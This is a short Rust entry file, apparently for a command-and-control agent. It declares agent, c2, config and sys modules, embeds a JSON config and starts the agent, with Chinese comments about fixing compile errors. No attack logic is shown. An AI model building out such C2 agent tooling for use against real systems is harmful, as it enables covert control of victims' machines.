mod agent;
mod c2;
mod config;
mod models;
mod sys;

#[derive(Debug)] // 确保派生了 Debug
pub enum NError {
    CheckError,
    Custom(String), // 🚀 补上这一行！那 4 个关于 Custom 的报错就会瞬间消失
}

pub type NResult<T> = core::result::Result<T, NError>;

const RAW_JSON: &str = include_str!("../config.json");

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let config = config::Config::load_json(RAW_JSON);
    agent::run_agent(config);
    Ok(())
}
